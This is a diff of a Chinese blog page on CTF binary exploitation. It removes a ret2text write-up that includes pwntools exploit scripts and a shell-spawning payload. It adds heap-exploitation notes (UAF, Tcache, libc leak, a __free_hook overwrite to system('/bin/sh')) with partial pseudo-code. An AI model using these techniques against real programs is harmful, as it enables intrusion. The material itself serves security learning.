@@ -20,40 +20,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"foundation","dark":"foundation"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="函数调用过程 call func&#x3D;push eip,jmp push ebp mov ebp,esp sub esp,0x20… leave &#x3D; mov esp,ebp;pop ebp ret &#x3D; pop eip  push,pop指令小结">
+    <meta name="description" content="heap初探 ​ ​核心概念 ​ ​   ​ ​UAF（Use After Free） ​ 	当一块内存（chunk）被free回堆管理器器，里面的指针没有被置空，就可以通过这个指针读出或写入内容当内存被复用时，可以利用悬空指针读取数据当内存空闲时，可以利用悬空指针修改向前指针，劫持分配流 ​ ​   ​  ​Tcache ​ 	当释放一个堆块时,会优先放入Tcache中当修改空闲块的前8个字节时">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习记录（其一）">
+<meta property="og:title" content="pwn学习记录（其七）">
 <meta property="og:url" content="http://example.com/posts/e04c41db/">
 <meta property="og:site_name" content="qsc">
-<meta property="og:description" content="函数调用过程 call func&#x3D;push eip,jmp push ebp mov ebp,esp sub esp,0x20… leave &#x3D; mov esp,ebp;pop ebp ret &#x3D; pop eip  push,pop指令小结">
+<meta property="og:description" content="heap初探 ​ ​核心概念 ​ ​   ​ ​UAF（Use After Free） ​ 	当一块内存（chunk）被free回堆管理器器，里面的指针没有被置空，就可以通过这个指针读出或写入内容当内存被复用时，可以利用悬空指针读取数据当内存空闲时，可以利用悬空指针修改向前指针，劫持分配流 ​ ​   ​  ​Tcache ​ 	当释放一个堆块时,会优先放入Tcache中当修改空闲块的前8个字节时">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/pwn1/checksec.png">
-<meta property="og:image" content="http://example.com/images/pwn1/cyc1.png">
-<meta property="og:image" content="http://example.com/images/pwn1/cyc2.png">
-<meta property="og:image" content="http://example.com/images/pwn1/total.png">
-<meta property="og:image" content="http://example.com/images/pwn1/main.png">
-<meta property="og:image" content="http://example.com/images/pwn1/vuln.png">
-<meta property="og:image" content="http://example.com/images/pwn1/backdoor.png">
-<meta property="og:image" content="http://example.com/images/pwn1/stack.png">
-<meta property="og:image" content="http://example.com/images/pwn1/backdoor_addr.png">
-<meta property="og:image" content="http://example.com/images/pwn1/fail.png">
-<meta property="og:image" content="http://example.com/images/pwn1/success.png">
-<meta property="article:published_time" content="2025-11-01T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-03T11:21:27.202Z">
+<meta property="article:published_time" content="2025-12-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-12T06:08:08.434Z">
 <meta property="article:author" content="qsc">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/pwn1/checksec.png">
 
 
 <link rel="canonical" href="http://example.com/posts/e04c41db/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/posts/e04c41db/","path":"posts/e04c41db/","title":"pwn学习记录（其一）"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/posts/e04c41db/","path":"posts/e04c41db/","title":"pwn学习记录（其七）"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>pwn学习记录（其一） | qsc</title>
+<title>pwn学习记录（其七） | qsc</title>
   
 
 
@@ -173,7 +161,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">函数调用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#push-pop%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93"><span class="nav-number">1.1.</span> <span class="nav-text">push,pop指令小结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#push"><span class="nav-number">1.1.1.</span> <span class="nav-text">push</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-number">1.1.2.</span> <span class="nav-text">pop</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text%E5%9F%BA%E7%A1%80%E5%85%B6%E4%B8%80-%E4%BB%A5TSCTF-J-ret%E9%A2%98%E4%B8%BA%E4%BE%8B"><span class="nav-number">2.</span> <span class="nav-text">ret2text基础其一(以TSCTF-J ret题为例)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">常见溢出函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">2.2.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cyclic"><span class="nav-number">2.3.</span> <span class="nav-text">cyclic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret"><span class="nav-number">2.4.</span> <span class="nav-text">ret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9wp"><span class="nav-number">2.5.</span> <span class="nav-text">官方wp</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#heap%E5%88%9D%E6%8E%A2-%E2%80%8B-%E2%80%8B"><span class="nav-number">1.</span> <span class="nav-text">heap初探 ​ ​</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5-%E2%80%8B-%E2%80%8B-%E2%80%8B"><span class="nav-number">1.1.</span> <span class="nav-text">核心概念 ​ ​   ​</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E8%AE%B2%E8%A7%A3"><span class="nav-number">1.2.</span> <span class="nav-text">具体代码讲解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E4%BA%8E-0x410-%E7%9A%84-chunk-%E9%87%8A%E6%94%BE%E5%90%8E%E5%85%88%E8%BF%9B%E5%85%A5-Tcache-%E6%AF%8F%E7%A7%8D%E5%A4%A7%E5%B0%8F%E6%9C%80%E5%A4%9A-7-%E4%B8%AA-%E3%80%82"><span class="nav-number">2.</span> <span class="nav-text">小于 0x410 的 chunk 释放后先进入 Tcache (每种大小最多 7 个)。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tcache-%E6%BB%A1%E4%BA%86%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%86%8D%E9%87%8A%E6%94%BE%E6%89%8D%E4%BC%9A%E8%BF%9B%E5%85%A5-Unsorted-Bin%E3%80%82"><span class="nav-number">3.</span> <span class="nav-text">Tcache 满了之后，再释放才会进入 Unsorted Bin。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsorted-Bin-%E9%87%8C%E7%9A%84-chunk-%E4%BC%9A%E5%8C%85%E5%90%AB%E6%8C%87%E5%90%91-libc-main-arena-%E7%9A%84%E6%8C%87%E9%92%88%E3%80%82"><span class="nav-number">4.</span> <span class="nav-text">Unsorted Bin 里的 chunk 会包含指向 libc (main_arena) 的指针。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7-9-%E4%B8%AA-chunk-0-8"><span class="nav-number">5.</span> <span class="nav-text">申请 9 个 chunk (0-8)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0-6-%E7%94%A8%E6%9D%A5%E5%A1%AB%E6%BB%A1-Tcache"><span class="nav-number">6.</span> <span class="nav-text">0-6: 用来填满 Tcache</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%E7%94%A8%E6%9D%A5%E8%BF%9B-Unsorted-Bin-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-number">7.</span> <span class="nav-text">7: 用来进 Unsorted Bin 泄露地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-%E9%98%B2%E6%AD%A2-chunk-7-%E9%87%8A%E6%94%BE%E6%97%B6%E4%B8%8E-Top-Chunk-%E5%90%88%E5%B9%B6"><span class="nav-number">8.</span> <span class="nav-text">8: 防止 chunk 7 释放时与 Top Chunk 合并</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%8A%E6%94%BE%E5%89%8D-7-%E4%B8%AA%EF%BC%8C%E5%A1%AB%E6%BB%A1-Tcache-list"><span class="nav-number">9.</span> <span class="nav-text">释放前 7 个，填满 Tcache list</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%8A%E6%94%BE%E7%AC%AC-8-%E4%B8%AA-idx-7-%EF%BC%8CTcache-%E6%BB%A1%E4%BA%86%EF%BC%8C%E8%A2%AB%E8%BF%AB%E8%BF%9B%E5%85%A5-Unsorted-Bin"><span class="nav-number">10.</span> <span class="nav-text">释放第 8 个 (idx 7)，Tcache 满了，被迫进入 Unsorted Bin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-UAF-Use-After-Free-%E6%BC%8F%E6%B4%9E"><span class="nav-number">11.</span> <span class="nav-text">利用 UAF (Use After Free) 漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%99%BD%E7%84%B6-delete-%E4%BA%86%EF%BC%8C%E4%BD%86%E6%8C%87%E9%92%88%E8%BF%98%E5%9C%A8%E6%95%B0%E7%BB%84%E9%87%8C%EF%BC%8Cshow-7-%E5%8F%AF%E4%BB%A5%E6%89%93%E5%8D%B0%E8%A2%AB%E9%87%8A%E6%94%BE%E5%9D%97%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96libc%E5%86%85%E9%83%A8%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%80%8C%E8%AE%A1%E7%AE%97libc%E5%9F%BA%E5%9D%80"><span class="nav-number">12.</span> <span class="nav-text">虽然 delete 了，但指针还在数组里，show(7) 可以打印被释放块的内容，就可以获取libc内部地址进而计算libc基址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%A6%82%E4%BD%95%E7%94%B3%E8%AF%B7%EF%BC%8C%E9%87%8A%E6%94%BE%E5%92%8C%E6%89%93%E5%8D%B0%E4%B8%8E%E5%85%B7%E4%BD%93%E9%A2%98%E7%9B%AE%E6%9C%89%E5%85%B3"><span class="nav-number">13.</span> <span class="nav-text">具体如何申请，释放和打印与具体题目有关</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A4%E6%97%B6-0x90-%E7%9A%84-Tcache-%E6%98%AF%E6%BB%A1%E7%9A%84%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8D%A2%E4%B8%AA%E5%A4%A7%E5%B0%8F-0x60-%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%8C%E6%AF%94%E8%BE%83%E5%B9%B2%E5%87%80"><span class="nav-number">14.</span> <span class="nav-text">此时 0x90 的 Tcache 是满的，我们换个大小 (0x60) 进行攻击，比较干净</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84-chunk-9"><span class="nav-number">15.</span> <span class="nav-text">申请一个新的 chunk 9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%8A%E6%94%BE%E5%AE%83%EF%BC%8C%E8%AE%A9%E5%AE%83%E8%BF%9B%E5%85%A5-Tcache-0x70-bin-%E7%9A%84%E9%93%BE%E8%A1%A8%E5%A4%B4%E9%83%A8"><span class="nav-number">16.</span> <span class="nav-text">释放它，让它进入 Tcache (0x70 bin) 的链表头部</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-UAF-%E4%BF%AE%E6%94%B9-fd-%E6%8C%87%E9%92%88"><span class="nav-number">17.</span> <span class="nav-text">利用 UAF 修改 fd 指针</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Glibc-2-27-Tcache-%E4%B8%8D%E6%A3%80%E6%9F%A5-fd-%E6%8C%87%E5%90%91%E5%93%AA%E9%87%8C%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E6%8C%87%E5%90%91-free-hook"><span class="nav-number">18.</span> <span class="nav-text">Glibc 2.27 Tcache 不检查 fd 指向哪里，我们直接指向 __free_hook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%B0%E5%9C%A8%E7%9A%84-Tcache-%E9%93%BE%E8%A1%A8-Chunk-9-free-hook"><span class="nav-number">19.</span> <span class="nav-text">现在的 Tcache 链表: [Chunk 9] -&gt; [__free_hook]</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%94%B3%E8%AF%B7%EF%BC%8C%E6%8A%8A-Chunk-9-%E5%8F%96%E5%87%BA%E6%9D%A5"><span class="nav-number">20.</span> <span class="nav-text">第一次申请，把 Chunk 9 取出来</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E7%94%B3%E8%AF%B7%EF%BC%8C%E6%8B%BF%E5%88%B0%E7%9A%84%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E4%BC%AA%E9%80%A0%E7%9A%84%E5%9C%B0%E5%9D%80-free-hook"><span class="nav-number">21.</span> <span class="nav-text">第二次申请，拿到的就是我们伪造的地址 (__free_hook)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A4%E6%97%B6-chunk-11-%E5%AF%B9%E5%BA%94%E7%9A%84%E5%86%85%E5%AD%98%E5%B0%B1%E6%98%AF-free-hook"><span class="nav-number">22.</span> <span class="nav-text">此时 chunk 11 对应的内存就是 __free_hook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A4%E6%97%B6-chunk-10-%E6%98%AF%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E5%A0%86%E5%9D%97%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8B%A5%E6%9C%89%E5%AE%83%E7%9A%84%E8%AF%BB%E5%86%99%E6%9D%83"><span class="nav-number">23.</span> <span class="nav-text">此时 chunk 10 是一个普通的堆块，我们拥有它的读写权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E5%BE%80-chunk-10-%E9%87%8C%E5%86%99%E5%85%A5-%E2%80%9C-bin-sh-x00%E2%80%9D"><span class="nav-number">24.</span> <span class="nav-text">1. 往 chunk 10 里写入 “&#x2F;bin&#x2F;sh\x00”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%BE%80-chunk-11-free-hook-%E9%87%8C%E5%86%99%E5%85%A5-system-%E5%87%BD%E6%95%B0%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">25.</span> <span class="nav-text">2. 往 chunk 11 (__free_hook) 里写入 system 函数的地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E8%A7%A6%E5%8F%91-Shell"><span class="nav-number">26.</span> <span class="nav-text">3. 触发 Shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A%E8%B0%83%E7%94%A8-free-10-%E6%97%B6%EF%BC%8C%E7%B3%BB%E7%BB%9F%E4%BC%9A%E6%A3%80%E6%9F%A5-free-hook%E3%80%82"><span class="nav-number">27.</span> <span class="nav-text">原理：调用 free(10) 时，系统会检查 __free_hook。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0-hook-%E8%A2%AB%E6%94%B9%E6%88%90%E4%BA%86-system%EF%BC%8C%E4%BA%8E%E6%98%AF%E6%89%A7%E8%A1%8C-system-chunk10%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">28.</span> <span class="nav-text">发现 hook 被改成了 system，于是执行 system(chunk10的内容)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%89%E4%BB%B7%E4%BA%8E-system-%E2%80%9C-bin-sh%E2%80%9D"><span class="nav-number">29.</span> <span class="nav-text">等价于 system(“&#x2F;bin&#x2F;sh”)</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -251,12 +239,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="pwn学习记录（其一） | qsc">
+      <meta itemprop="name" content="pwn学习记录（其七） | qsc">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwn学习记录（其一）
+          pwn学习记录（其七）
         </h1>
 
         <div class="post-meta-container">
@@ -268,14 +256,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2025-11-02 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-02T00:00:00+08:00">2025-11-02</time>
+      <time title="创建时间：2025-12-06 00:00:00" itemprop="dateCreated datePublished" datetime="2025-12-06T00:00:00+08:00">2025-12-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-11-03 19:21:27" itemprop="dateModified" datetime="2025-11-03T19:21:27+08:00">2025-11-03</time>
+      <time title="修改时间：2025-12-12 14:08:08" itemprop="dateModified" datetime="2025-12-12T14:08:08+08:00">2025-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -301,7 +289,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.7k</span>
+      <span>1.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -318,55 +306,33 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h1><ol>
-<li>call func&#x3D;push eip,jmp</li>
-<li>push ebp</li>
-<li>mov ebp,esp</li>
-<li>sub esp,0x20<br>…</li>
-<li>leave &#x3D; mov esp,ebp;pop ebp</li>
-<li>ret &#x3D; pop eip</li>
-</ol>
-<h2 id="push-pop指令小结"><a href="#push-pop指令小结" class="headerlink" title="push,pop指令小结"></a>push,pop指令小结</h2><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>执行push ax指令时，相当于将指针减小，再将ax中的内容放入指针所指的内存单元处，指针指向新栈顶</p>
-<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>执行pop ax指令时，相当于将指针所指的内容放入ax处，再将指针增大，指针指向新栈顶</p>
-<hr>
-<h1 id="ret2text基础其一-以TSCTF-J-ret题为例"><a href="#ret2text基础其一-以TSCTF-J-ret题为例" class="headerlink" title="ret2text基础其一(以TSCTF-J ret题为例)"></a>ret2text基础其一(以TSCTF-J ret题为例)</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于程序使用了gets，strcpy等易溢出函数，导致读取的数据溢出，覆盖栈上的返回地址和控制参数，使指针跳转到想要的func地址位置。</p>
-<h3 id="常见溢出函数"><a href="#常见溢出函数" class="headerlink" title="常见溢出函数"></a>常见溢出函数</h3><p>gets；scanf；strcpy；sprintf：memcpy；strcat……</p>
-<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec函数可以用来查看程序开了什么保护措施<br><img src="/images/pwn1/checksec.png" alt="checksec 返回结果" title="返回结果"><br>No canary found即意味可以利用栈溢出来获得shell</p>
-<h2 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h2><p>通过cyclic生成指定长度的字符串，注入字符串，可以知道栈的大小<br><img src="/images/pwn1/cyc1.png" alt="cyclic 示意" title="示例"><br><img src="/images/pwn1/cyc2.png" alt="cyclic 示意" title="示例"><br>如图，在注入16个字符时程序并没有报错，而注入24个字符时程序报错，说明想要使栈溢出，至少要注入24个字符<br>或是构建脚本</p>
-<pre><code>from pwn import *
-context.log_level = &#39;debug&#39;
-# 生成测试pattern
-io = process(&#39;./pwn&#39;)
-pattern = cyclic(100)
-io.sendlineafter(b&#39;Just a simple sign-in!&#39;, pattern)
-io.wait()
-# 分析崩溃地址
-core = io.corefile
-rip = core.rip
-print(f&quot;崩溃地址: &#123;hex(rip)&#125;&quot;)
-# 计算偏移量
-offset = cyclic_find(rip &amp; 0xffffffffffff)
-print(f&quot;精确偏移量: &#123;offset&#125;&quot;)
-</code></pre>
-<h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>在ida中打开程序，注意到main函数，vuln函数，和backdoor函数，一个是主函数，另一个是可以利用的漏洞，而最后一个和打通这个程序息息相关<br><img src="/images/pwn1/total.png" alt="total" title="total"><br><img src="/images/pwn1/main.png" alt="main" title="main"><br><img src="/images/pwn1/vuln.png" alt="vuln" title="vuln"><br><img src="/images/pwn1/backdoor.png" alt="backdoor" title="backdoor"></p>
-<p>不仅可以通过cyclic查看溢出需要的字节数，也可以通过ida查看计算<br><img src="/images/pwn1/stack.png" alt="stack" title="stack"><br>如图vuln占据了8+10&#x3D;18个字节，而rbp本身还占8个字节，因此需要24个字节，计算结果与cyclic结果相同</p>
-<p>接下来找到backdoor地址来跳转（0x400676）<br><img src="/images/pwn1/backdoor_addr.png" alt="backdoor" title="backdoor"><br>接下来构建payload&#x3D;b’a’*24+p64(0X4006760)</p>
-<pre><code>io=process(&#39;./pwn&#39;)
-io.recvuntil(&#39;Welcome to TSCTF-J2025!\nJust a simple sign-in!\n&#39;)
-payload=b&#39;a&#39;*24+p64(0x400676)
-io.send(payload)
-io.interactive()
-</code></pre>
-<p>提交后发现无法成功<br><img src="/images/pwn1/fail.png" alt="wrongpayload" title="wrong"><br>这是因为还需要栈对齐（这与本地的操作系统有一定关系）<br>详细可查看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/611961995" title="CTFer成长日记12：栈对齐—获取shell前的临门一脚">栈对齐</a></p>
-<p>在payload中加上p64(ret)<br><img src="/images/pwn1/success.png" alt="success" title="success"><br>输入命令ls后列出目录，说明已经获得权限</p>
-<h2 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h2><p>以上是做题时的想法，接下来展示官方给出的做法</p>
-<pre><code>io=process(&#39;./pwn&#39;)
-io.recvuntil(&#39;Welcome to TSCTF-J2025!\nJust a simple sign-in!\n&#39;)
-payload=b&#39;a&#39;*24+p64(0x40067a)
-io.send(payload)
-io.interactive()    
-</code></pre>
-<p>0x40067a 所对应的汇编代码为<code>mov edi, offset command ; &quot;/bin/sh&quot;</code>类似于直接执行system，跳过了前面的<code>push rbp</code>，也就不用栈对齐,更加简洁，也可能更加不稳定(?)，但值得借鉴</p>
+    <div class="post-body" itemprop="articleBody"><h1 id="heap初探-​-​"><a href="#heap初探-​-​" class="headerlink" title="heap初探 ​ ​"></a>heap初探 ​ ​</h1><h2 id="核心概念-​-​-​"><a href="#核心概念-​-​-​" class="headerlink" title="核心概念 ​ ​   ​"></a>核心概念 ​ ​   ​</h2><ul>
+<li>​UAF（Use After Free） ​ 	<br>当一块内存（chunk）被free回堆管理器器，里面的指针没有被置空，就可以通过这个指针读出或写入内容<br>当内存被复用时，可以利用悬空指针读取数据<br>当内存空闲时，可以利用悬空指针修改向前指针，劫持分配流 ​ ​   ​ </li>
+<li>​Tcache ​ 	<br>当释放一个堆块时,会优先放入Tcache中<br>当修改空闲块的前8个字节时，就能将写入下一次申请内存时分配的地址</li>
+<li>Unsorted Bin<br>当Tcache被填满时，后续释放的堆块会进入Unsorted Bin<br>进入这里的第一个堆块，向前和向后指针会指向libc内部地址，进而算出libc基址</li>
+<li>Heap Overflow<br>往堆块中写入数据时超过了申请的大小，覆盖了下一个堆块的header，就可以修改下一个堆块的大小导致堆重叠，或者将下一个堆块的P位改为0，就可以合并chunk</li>
+<li>Double Free<br>释放两次同一个指针，实现A-&gt;B-&gt;A，申请A时，修改内容，B的向前指针也会被修改，实现任意地址分配。</li>
+</ul>
+<h2 id="具体代码讲解"><a href="#具体代码讲解" class="headerlink" title="具体代码讲解"></a>具体代码讲解</h2><ul>
+<li><p>step 1 通过UAF泄露libc基址</p>
+<h1 id="小于-0x410-的-chunk-释放后先进入-Tcache-每种大小最多-7-个-。"><a href="#小于-0x410-的-chunk-释放后先进入-Tcache-每种大小最多-7-个-。" class="headerlink" title="小于 0x410 的 chunk 释放后先进入 Tcache (每种大小最多 7 个)。"></a>小于 0x410 的 chunk 释放后先进入 Tcache (每种大小最多 7 个)。</h1><h1 id="Tcache-满了之后，再释放才会进入-Unsorted-Bin。"><a href="#Tcache-满了之后，再释放才会进入-Unsorted-Bin。" class="headerlink" title="Tcache 满了之后，再释放才会进入 Unsorted Bin。"></a>Tcache 满了之后，再释放才会进入 Unsorted Bin。</h1><h1 id="Unsorted-Bin-里的-chunk-会包含指向-libc-main-arena-的指针。"><a href="#Unsorted-Bin-里的-chunk-会包含指向-libc-main-arena-的指针。" class="headerlink" title="Unsorted Bin 里的 chunk 会包含指向 libc (main_arena) 的指针。"></a>Unsorted Bin 里的 chunk 会包含指向 libc (main_arena) 的指针。</h1><h1 id="申请-9-个-chunk-0-8"><a href="#申请-9-个-chunk-0-8" class="headerlink" title="申请 9 个 chunk (0-8)"></a>申请 9 个 chunk (0-8)</h1><h1 id="0-6-用来填满-Tcache"><a href="#0-6-用来填满-Tcache" class="headerlink" title="0-6: 用来填满 Tcache"></a>0-6: 用来填满 Tcache</h1><h1 id="7-用来进-Unsorted-Bin-泄露地址"><a href="#7-用来进-Unsorted-Bin-泄露地址" class="headerlink" title="7: 用来进 Unsorted Bin 泄露地址"></a>7: 用来进 Unsorted Bin 泄露地址</h1><h1 id="8-防止-chunk-7-释放时与-Top-Chunk-合并"><a href="#8-防止-chunk-7-释放时与-Top-Chunk-合并" class="headerlink" title="8: 防止 chunk 7 释放时与 Top Chunk 合并"></a>8: 防止 chunk 7 释放时与 Top Chunk 合并</h1><p>  for i in range(9):<br>  add(i, 0x90) # size 0x90 (144)</p>
+<h1 id="释放前-7-个，填满-Tcache-list"><a href="#释放前-7-个，填满-Tcache-list" class="headerlink" title="释放前 7 个，填满 Tcache list"></a>释放前 7 个，填满 Tcache list</h1><p>  for i in range(7):<br>  delete(i)</p>
+<h1 id="释放第-8-个-idx-7-，Tcache-满了，被迫进入-Unsorted-Bin"><a href="#释放第-8-个-idx-7-，Tcache-满了，被迫进入-Unsorted-Bin" class="headerlink" title="释放第 8 个 (idx 7)，Tcache 满了，被迫进入 Unsorted Bin"></a>释放第 8 个 (idx 7)，Tcache 满了，被迫进入 Unsorted Bin</h1><p>  delete(7)</p>
+<h1 id="利用-UAF-Use-After-Free-漏洞"><a href="#利用-UAF-Use-After-Free-漏洞" class="headerlink" title="利用 UAF (Use After Free) 漏洞"></a>利用 UAF (Use After Free) 漏洞</h1><h1 id="虽然-delete-了，但指针还在数组里，show-7-可以打印被释放块的内容，就可以获取libc内部地址进而计算libc基址"><a href="#虽然-delete-了，但指针还在数组里，show-7-可以打印被释放块的内容，就可以获取libc内部地址进而计算libc基址" class="headerlink" title="虽然 delete 了，但指针还在数组里，show(7) 可以打印被释放块的内容，就可以获取libc内部地址进而计算libc基址"></a>虽然 delete 了，但指针还在数组里，show(7) 可以打印被释放块的内容，就可以获取libc内部地址进而计算libc基址</h1><p>  show(7)</p>
+<h1 id="具体如何申请，释放和打印与具体题目有关"><a href="#具体如何申请，释放和打印与具体题目有关" class="headerlink" title="具体如何申请，释放和打印与具体题目有关"></a>具体如何申请，释放和打印与具体题目有关</h1></li>
+<li><p>step 2 劫持__free_hook</p>
